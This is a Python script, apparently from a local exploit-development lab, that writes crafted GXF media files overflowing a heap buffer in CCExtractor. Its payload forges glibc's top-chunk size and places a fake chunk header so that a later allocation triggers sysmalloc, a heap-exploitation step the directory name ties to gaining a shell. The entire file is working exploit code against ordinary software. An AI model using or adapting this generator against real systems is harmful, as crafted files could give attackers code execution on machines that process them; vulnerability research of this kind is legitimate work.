#!/usr/bin/env python3
"""Local-only W8 generator: forge a small top-chunk size in the overflow bytes.

Same pinned GXF layout as make_readback_gxf.py. The first eight bytes written
past malloc(BUFSIZE) are the top chunk's size field; this script sets them to
a small value so that a later malloc must call sysmalloc. The following fake
chunk header is placed where glibc checks the next-chunk size after freeing
the old top. Nothing in the pinned tree or harness is edited.
"""
import struct
import sys
from pathlib import Path

BUFSIZE = 2048 * 1024 + 120
PIC_SIZE = 0x201000
OUTDIR = Path("lab/frontier/ccextractor2shell/real-build/inputs")


def packet(kind: int, body: bytes) -> bytes:
    total = 16 + len(body)
    header = b"\x00\x00\x00\x00\x01" + bytes([kind]) + struct.pack(">I", total)
    return header + b"\x00\x00\x00\x00\xe1\xe2" + body


def map_packet() -> bytes:
    track = bytes([0x80 | 11, 0xC0]) + struct.pack(">H", 6)
    track += bytes([0x50, 4]) + struct.pack(">I", 6)
    body = b"\xe0\xff" + struct.pack(">H", 0) + struct.pack(">H", len(track))
    return packet(0xBC, body + track)


def make(top_size: int) -> Path:
    seed = b"MISHE-CCEX"
    prefix = (seed * (BUFSIZE // len(seed) + 1))[:BUFSIZE]
    assert 0 not in prefix
    # top chunk header starts 8 bytes before BUFSIZE; its size field is at BUFSIZE.
    tail = struct.pack("<Q", top_size)
    # User bytes of the 0x20-byte old top, then the next chunk's size field.
    tail += b"\x41" * 16
    tail += struct.pack("<Q", 0x205E1)
    tail += b"\x41" * (PIC_SIZE - BUFSIZE - len(tail))
    assert len(prefix) + len(tail) == PIC_SIZE
    body = bytes([11, 0]) + struct.pack(">I", 0) + struct.pack(">I", PIC_SIZE)
    body += struct.pack(">I", 0) + b"\x00\x00"
    out = OUTDIR / f"topsize-{top_size:x}.gxf"
    out.write_bytes(map_packet() + packet(0xBF, body + prefix + tail))
    print(f"{out} size={out.stat().st_size} top_size=0x{top_size:x}")
    return out


if __name__ == "__main__":
    for value in (int(arg, 0) for arg in sys.argv[1:]):
        make(value)
